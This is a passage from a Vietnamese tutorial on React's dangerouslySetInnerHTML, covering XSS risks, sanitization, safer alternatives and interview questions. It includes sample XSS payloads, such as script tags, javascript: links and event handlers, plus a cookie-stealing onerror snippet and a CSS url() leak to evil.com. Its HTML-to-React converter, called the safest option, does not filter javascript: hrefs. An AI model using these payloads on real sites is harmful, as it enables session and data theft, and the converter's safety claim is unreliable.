  '<p style="color:red;background:url(evil.com)">Red text</p>' +
  "<script>alert(1)</script>" +
  '<a href="javascript:void(0)">Bad link</a>' +
  '<a href="https://good.com">Good link</a>' +
  '<img src="data:text/html,<script>alert(1)</script>" alt="test">' +
  '<div onmouseover="alert(1)">Hover</div>';

var result = engine.sanitize(dirty);
console.log("HTML:", result.html);
console.log("Warnings:", result.warnings);
console.log("Safe?", result.safe);
// HTML: '<h1>Title</h1><p style="color:red">Red text</p>
//        <a href="https://good.com" rel="noopener noreferrer">Good link</a>
//        <div>Hover</div>'
// → script → XÓA!
// → javascript: href → XÓA!
// → data: src → XÓA!
// → url() trong CSS → XÓA!
// → onmouseover → XÓA!
```

---

## §8. Các Use Case Thực Tế & Best Practices!

```
  KHI NÀO DÙNG dangerouslySetInnerHTML?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ✅ ĐÚNG — Use Cases Hợp Lệ:                           │
  │                                                        │
  │  ① CMS Content đã sanitize ở server:                   │
  │     API → sanitize → database → API response           │
  │     → React render (đã safe)                           │
  │                                                        │
  │  ② Markdown → HTML conversion:                          │
  │     User markdown → marked.js → sanitize → render      │
  │                                                        │
  │  ③ Code syntax highlighting:                            │
  │     Source code → highlight.js → HTML spans             │
  │     → render với syntax colors                         │
  │                                                        │
  │  ❌ SAI — KHÔNG BAO GIỜ LÀM:                           │
  │                                                        │
  │  ① TRỰC TIẾP render user input:                        │
  │     <div dangerouslySetInnerHTML={{                     │
  │       __html: userComment  // ❌ NGUY HIỂM!            │
  │     }} />                                              │
  │                                                        │
  │  ② Render API response KHÔNG sanitize:                  │
  │     fetch('/api/data')                                 │
  │       .then(data =>                                    │
  │         <div dangerouslySetInnerHTML={{                 │
  │           __html: data.html  // ❌ API bị hack?        │
  │         }} />                                          │
  │       )                                                │
  │                                                        │
  │  ③ Render URL parameter:                                │
  │     var html = new URLSearchParams(                     │
  │       location.search).get('content');                 │
  │     <div dangerouslySetInnerHTML={{                     │
  │       __html: html  // ❌ DOM-based XSS!               │
  │     }} />                                              │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```javascript
// ═══════════════════════════════════════════════════════════
// BEST PRACTICES — CÁCH DÙNG ĐÚNG!
// ═══════════════════════════════════════════════════════════

// ✅ PATTERN 1: Sanitize LUÔN trước khi render:
function CMSContent(props) {
  var sanitized = createSafeHTML(props.htmlFromCMS);
  return {
    $$typeof: Symbol.for("react.element"),
    type: "article",
    props: { dangerouslySetInnerHTML: sanitized },
  };
}

// ✅ PATTERN 2: Dùng useMemo để cache kết quả sanitize:
function OptimizedContent(props) {
  // Chỉ sanitize khi html thay đổi:
  var sanitized = React.useMemo(
    function () {
      return createSafeHTML(props.html);
    },
    [props.html],
  );

  return {
    $$typeof: Symbol.for("react.element"),
    type: "div",
    props: { dangerouslySetInnerHTML: sanitized },
  };
}

// ✅ PATTERN 3: HOC (Higher-Order Component) wrapper:
function withSafeHTML(WrappedComponent) {
  return function SafeHTMLWrapper(props) {
    var safeProps = {};
    var keys = Object.keys(props);
    for (var i = 0; i < keys.length; i++) {
      if (keys[i] === "html") {
        safeProps.dangerouslySetInnerHTML = createSafeHTML(props.html);
      } else {
        safeProps[keys[i]] = props[keys[i]];
      }
    }
    return {
      $$typeof: Symbol.for("react.element"),
      type: WrappedComponent,
      props: safeProps,
    };
  };
}

// ✅ PATTERN 4: Custom Hook:
function useSafeHTML(dirtyHtml, options) {
  return React.useMemo(
    function () {
      if (!dirtyHtml) return { __html: "" };
      return createSafeHTML(dirtyHtml, options);
    },
    [dirtyHtml],
  );
}

// Sử dụng:
function BlogPost(props) {
  var safeContent = useSafeHTML(props.content);
  return {
    $$typeof: Symbol.for("react.element"),
    type: "article",
    props: {
      className: "blog-post",
      dangerouslySetInnerHTML: safeContent,
    },
  };
}
```

---

## §9. Alternatives — Không Dùng dangerouslySetInnerHTML!

```javascript
// ═══════════════════════════════════════════════════════════
// ALTERNATIVES — CÁCH KHÁC THAY THẾ!
// Tránh dangerouslySetInnerHTML khi có thể!
// ═══════════════════════════════════════════════════════════

// ① ALTERNATIVE 1: Parse HTML → React Elements:
// Convert HTML string thành React components!
function htmlToReactElements(html) {
  var parser = new DOMParser();
  var doc = parser.parseFromString(html, "text/html");

  function nodeToElement(node) {
    // Text node:
    if (node.nodeType === 3) return node.textContent;
    if (node.nodeType !== 1) return null;

    var tag = node.tagName.toLowerCase();

    // Block dangerous tags:
    if (tag === "script" || tag === "style" || tag === "iframe") {
      return null;
    }

    // Convert attributes:
    var props = {};
    for (var i = 0; i < node.attributes.length; i++) {
      var attr = node.attributes[i];
      var name = attr.name;

      // Skip event handlers:
      if (name.indexOf("on") === 0) continue;

      // React attribute mapping:
      if (name === "class") name = "className";
      if (name === "for") name = "htmlFor";

      props[name] = attr.value;
    }

    // Convert children:
    var children = [];
    for (var j = 0; j < node.childNodes.length; j++) {
      var child = nodeToElement(node.childNodes[j]);
      if (child !== null) children.push(child);
    }

    // Return React element (KHÔNG dùng innerHTML!):
    return {
      $$typeof: Symbol.for("react.element"),
      type: tag,
      props: Object.assign({}, props, {
        children: children.length === 1 ? children[0] : children,
      }),
      key: null,
    };
  }

  var elements = [];
  for (var i = 0; i < doc.body.childNodes.length; i++) {
    var el = nodeToElement(doc.body.childNodes[i]);
    if (el !== null) elements.push(el);
  }
  return elements;
}

// ② ALTERNATIVE 2: Template Literals + JSX:
// Thay vì HTML string → dùng React components trực tiếp!
function RichContent(props) {
  // ❌ Thay vì: dangerouslySetInnerHTML={{ __html: '<h1>Title</h1><p>...</p>' }}
  // ✅ Dùng JSX trực tiếp:
  return {
    $$typeof: Symbol.for("react.element"),
    type: "div",
    props: {
      children: [
        {
          $$typeof: Symbol.for("react.element"),
          type: "h1",
          props: { children: props.title },
        },
        {
          $$typeof: Symbol.for("react.element"),
          type: "p",
          props: { children: props.content },
        },
      ],
    },
  };
}

// ③ ALTERNATIVE 3: ref + textContent (cho plain text):
function SafeText(props) {
  var ref = React.useRef(null);
  React.useEffect(
    function () {
      if (ref.current) {
        // textContent — KHÔNG parse HTML!
        ref.current.textContent = props.text;
      }
    },
    [props.text],
  );
  return {
    $$typeof: Symbol.for("react.element"),
    type: "div",
    props: { ref: ref },
  };
}
```

```
  ALTERNATIVES — SO SÁNH:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Phương pháp           An toàn  Flexibility  Hiệu năng│
  │  ─────────────────────────────────────────────────────│
  │  JSX components        ⭐⭐⭐    ⭐⭐         ⭐⭐⭐    │
  │  textContent (ref)     ⭐⭐⭐    ⭐           ⭐⭐⭐    │
  │  HTML → React Elements ⭐⭐⭐    ⭐⭐⭐       ⭐⭐      │
  │  Sanitized innerHTML   ⭐⭐      ⭐⭐⭐       ⭐⭐⭐    │
  │  Raw innerHTML         ⭐        ⭐⭐⭐       ⭐⭐⭐    │
  │                                                        │
  │  KHUYẾN NGHỊ:                                          │
  │  ① Ưu tiên JSX components khi có thể!                 │
  │  ② Nếu PHẢI render HTML → LUÔN sanitize!              │
  │  ③ Dùng useMemo để cache sanitize result!              │
  │  ④ Thêm CSP headers ở server!                          │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §10. Tổng Kết & Câu Hỏi Phỏng Vấn!

### 10.1. Tổng Kết!

```
  dangerouslySetInnerHTML — TỔNG KẾT:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ① ĐỊNH NGHĨA:                                        │
  │  → Prop đặc biệt cho phép render raw HTML trong React │
  │  → Nhận { __html: '...' } object                      │
  │  → Bên trong dùng element.innerHTML                    │
  │                                                        │
  │  ② TẠI SAO "DANGEROUS":                                │
  │  → Bypass toàn bộ auto-escape của React                │
  │  → innerHTML parse HTML → chạy event handlers          │
  │  → createTextNode() KHÔNG được gọi                     │
  │  → $$typeof Symbol KHÔNG bảo vệ                        │
  │  → Mở cửa cho XSS, phishing, keylogging...            │
  │                                                        │
  │  ③ KHI NÀO DÙNG:                                      │
  │  → CMS/Rich Editor content (đã sanitize ở server)     │
  │  → Markdown → HTML conversion                         │
  │  → Code syntax highlighting                            │
  │  → LUÔN PHẢI SANITIZE TRƯỚC KHI RENDER!               │
  │                                                        │
  │  ④ CÁCH BẢO VỆ:                                        │
  │  → Whitelist tags + attributes                         │
  │  → Block event handlers (on*)                          │
  │  → Validate URL protocols (chặn javascript:)           │
  │  → Sanitize CSS (chặn url(), expression())             │
  │  → Dùng DOMParser → clean → render                    │
  │  → CSP headers ở server                                │
  │                                                        │
  │  ⑤ ALTERNATIVES:                                       │
  │  → Parse HTML → React elements (AN TOÀN NHẤT!)        │
  │  → Dùng JSX components trực tiếp                      │
  │  → ref + textContent cho plain text                    │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 10.2. Câu Hỏi Phỏng Vấn!

**❓ Q1: dangerouslySetInnerHTML là gì và tại sao nó được coi là nguy hiểm?**

> `dangerouslySetInnerHTML` là prop đặc biệt trong React cho phép render raw HTML bằng cách dùng `innerHTML`. Nó nguy hiểm vì **bypass toàn bộ cơ chế auto-escape** của React. Bình thường React dùng `createTextNode()` (CSR) và `escapeHtml()` (SSR) để tự động escape — nhưng khi dùng prop này, React gọi `element.innerHTML = html` trực tiếp, cho phép browser parse và thực thi code JavaScript trong HTML (qua `<script>`, event handlers như `onerror`, `onload`, hay `javascript:` URLs).

**❓ Q2: Tại sao React yêu cầu format `{ __html: '...' }` thay vì truyền string trực tiếp?**

> Đây là **deliberate API friction** — React team cố tình thiết kế API bất tiện để: (1) Developer PHẢI tạo object rõ ràng, không thể vô tình truyền string, (2) Double underscore `__html` gợi ý "internal/private" tạo cảm giác "không nên dùng", (3) Dễ detect bằng ESLint rules và code review (`grep "__html"`), (4) Ngăn chặn việc vô tình truyền user input thẳng vào prop.

**❓ Q3: Nêu ít nhất 5 loại tấn công có thể xảy ra khi dùng dangerouslySetInnerHTML không đúng cách?**

> 1. **Cookie Theft XSS** — `<img onerror="send(document.cookie)">` đánh cắp session
> 2. **Phishing** — Chèn form đăng nhập giả mạo, lừa user nhập password
> 3. **Keylogging** — `addEventListener('keypress')` ghi lại mọi phím bấm
> 4. **DOM Defacement** — Thay đổi nội dung trang (giá cả, thông tin)
> 5. **Cryptocurrency Mining** — Chèn script đào coin dùng CPU user
> 6. **SVG XSS** — `<svg onload="...">` bypass các filter chỉ chặn img/script
> 7. **CSS Injection** — `style="background:url(evil.com?data=...)"` leak data

**❓ Q4: Làm thế nào để sử dụng dangerouslySetInnerHTML an toàn?**

> **LUÔN sanitize HTML trước khi render!** Cách làm: (1) Dùng DOMParser để parse HTML an toàn (không execute scripts), (2) Whitelist tags cho phép (`b`, `i`, `p`, `a`...), (3) Whitelist attributes (chặn tất cả `on*` event handlers), (4) Validate URLs trong `href`/`src` (chặn `javascript:`, `data:`, `vbscript:`), (5) Sanitize CSS (chặn `url()`, `expression()`), (6) Giới hạn độ dài input. Ngoài ra, set CSP headers ở server và dùng `useMemo` để cache kết quả sanitize.

**❓ Q5: Có những alternative nào thay thế dangerouslySetInnerHTML?**

> 1. **Parse HTML → React Elements** — Dùng DOMParser convert HTML thành React component tree (an toàn nhất vì không dùng innerHTML)
> 2. **JSX components trực tiếp** — Nếu biết cấu trúc HTML, viết JSX instead of HTML string
> 3. **ref + textContent** — Cho plain text, dùng `textContent` thay `innerHTML` (không parse HTML)
> 4. **Structured data** — Server trả JSON thay vì HTML, React render từ data

**❓ Q6: Giải thích sự khác biệt giữa textContent và innerHTML trong context React?**

> - **textContent** (React default cho string children): Tạo text node (`nodeType = 3`), KHÔNG parse HTML → `<b>text</b>` hiển thị dạng text thuần
> - **innerHTML** (dangerouslySetInnerHTML): Parse HTML string thành DOM elements (`nodeType = 1`), browser thực thi event handlers, tạo nested elements → `<b>text</b>` hiển thị chữ **bold**
>   React mặc định dùng `textContent` (qua `createTextNode()`) vì nó AN TOÀN. Khi dùng `dangerouslySetInnerHTML`, React chuyển sang `innerHTML` → bypass bảo vệ!

**❓ Q7: Tại sao không thể dùng children cùng lúc với dangerouslySetInnerHTML?**

> React sẽ throw Error nếu dùng cả hai! Lý do: `dangerouslySetInnerHTML` dùng `innerHTML` để set nội dung, nó sẽ **GHI ĐÈ** toàn bộ children. Nếu cho phép cả hai, React sẽ phải quyết định ưu tiên cái nào → gây confusion. React chọn cách an toàn: **throw error ngay** để developer biết và sửa.

---

> 📝 **Ghi nhớ cuối cùng:**
> "`dangerouslySetInnerHTML` = escape hatch của React cho việc render raw HTML. Tên 'dangerously' là LỜI CẢNH BÁO có chủ đích. Nếu PHẢI dùng → LUÔN sanitize. Nếu có thể → dùng alternatives an toàn hơn!"
